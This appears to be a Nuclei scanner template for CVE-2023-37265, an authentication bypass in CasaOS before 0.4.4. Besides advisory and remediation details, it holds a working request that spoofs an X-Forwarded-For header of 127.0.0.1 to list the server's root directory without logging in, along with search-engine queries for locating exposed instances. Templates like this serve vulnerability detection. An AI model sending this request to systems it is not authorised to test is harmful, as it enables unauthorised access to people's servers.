id: CVE-2023-37265

info:
  name: CasaOS  < 0.4.4 - Authentication Bypass via Internal IP
  author: iamnoooob,DhiyaneshDK,pdresearch
  severity: critical
  description: |
    CasaOS is an open-source Personal Cloud system. Due to a lack of IP address verification an unauthenticated attackers can execute arbitrary commands as `root` on CasaOS instances. The problem was addressed by improving the detection of client IP addresses in `391dd7f`. This patch is part of CasaOS 0.4.4. Users should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly.
  remediation: The problem was addressed by improving the detection of client IP addresses in 391dd7f. This patch is part of CasaOS 0.4.4.
  reference:
    - https://github.com/IceWhaleTech/CasaOS/commit/705bf1facbffd2ca40b159b0303132b6fdf657ad
    - https://github.com/IceWhaleTech/CasaOS/security/advisories/GHSA-m5q5-8mfw-p2hr
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
    epss-score: 0.00044
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="/CasaOS-UI/public/index.html"
    shodan-query: http.html:"/CasaOS-UI/public/index.html"
  tags: cve,cve2023,oss,casaos,jwt

http:
  - method: GET
    path:
      - "{{BaseURL}}/v1/folder?path=%2F"

    headers:
      X-Forwarded-For: 127.0.0.1

    matchers:
      - type: word
        words:
          - '"success":200'
          - '"message":"ok"'
          - 'content'
          - 'is_dir'
        condition: and

    extractors:
      - type: json
        json:
          - .data.content[].path
